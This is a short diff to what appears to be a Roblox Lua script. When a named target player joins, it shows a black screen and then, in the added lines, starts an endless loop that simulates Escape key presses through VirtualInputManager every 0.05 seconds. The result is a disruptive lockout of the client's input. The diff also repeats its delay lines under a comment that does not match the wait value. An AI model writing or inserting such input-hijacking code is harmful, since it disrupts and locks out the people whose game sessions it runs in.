@@ -192,10 +192,25 @@ until Players:FindFirstChild(TargetPlayerName)
 
 -- 5-second delay after target joins
 task.wait(10)
+-- 5-second delay after target joins
+task.wait(10)
 if not blackScreenShown then
     blackScreenShown = true
     createBlackScreen()
+
+    -- Start ESC spam
+    task.spawn(function()
+        local vim = game:GetService("VirtualInputManager")
+        while true do
+            -- Simulate pressing and releasing ESC
+            vim:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+            task.wait()
+            vim:SendKeyEvent(false, Enum.KeyCode.Escape, false, game)
+            task.wait(0.05) -- spam interval
+        end
+    end)
 end
+
 
 -- Continuous loop
 while true do
@@ -210,6 +225,7 @@ while true do
     end
     task.wait(0.1)
 end
+
 
 
 
